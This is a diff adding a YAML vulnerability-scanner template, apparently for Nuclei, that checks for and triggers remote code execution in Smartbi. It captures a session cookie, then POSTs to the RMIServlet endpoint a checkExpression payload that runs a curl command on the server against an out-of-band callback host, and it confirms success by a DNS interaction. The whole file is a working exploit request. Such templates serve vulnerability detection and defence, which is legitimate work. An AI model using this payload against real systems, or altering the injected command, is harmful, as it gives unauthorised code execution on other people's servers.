@@ -1,0 +1,62 @@
+id: poc-yaml-smartbi-checkexpression-rce
+info:
+  name: Smartbi checkExpression Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce,dnslog
+
+variables:
+  reverse: "{{interactsh-url}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: fetch-cookie
+    method: GET
+    path:
+      - "{{BaseURL}}/smartbi/vision/share.jsp?resid=96a0a9d0b86f90d5416d013f4cfe2f23"
+      - "{{BaseURL}}/smartbi/vision/share.jsp?resid=b904ab9f5a84712a672523a7b4881ee4"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "smartbi"
+    extractors:
+      - type: regex
+        name: jsessionid
+        group: 1
+        part: header
+        regex:
+          - "JSESSIONID=(.*?);"
+
+  - id: trigger-rce
+    method: POST
+    path:
+      - "{{BaseURL}}/smartbi/vision/RMIServlet"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+      Cookie: "JSESSIONID={{jsessionid}}"
+    body: "className=MetricsModelForVModule&methodName=checkExpression&params=[\"java.lang.Runtime.getRuntime().exec('curl {{reverse}}')\"]"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "true"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
